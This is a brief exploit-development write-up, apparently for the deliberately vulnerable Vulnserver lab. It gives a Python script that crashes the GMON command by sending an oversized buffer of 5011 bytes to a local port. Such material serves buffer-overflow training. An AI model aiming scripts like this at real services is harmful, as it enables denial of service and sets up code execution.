# Vulnserver - GMON Command

Downloaded from: https://github.com/stephenbradshaw/vulnserver

## Initial Crash

```py
import struct
import socket

VULNSRVR_CMD = b"GMON  /.:/"  # change me
CRASH_LEN = 5011  # change me
TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999

target = (TARGET_IP, TARGET_PORT)  # vulnserver

payload = VULNSRVR_CMD
payload += b"A" * CRASH_LEN

with socket.create_connection(target) as sock:
    sock.recv(512)  # Welcome to Vulnerable Server! ... 

    sent = sock.send(payload)
    print(f"sent {sent} bytes")
```
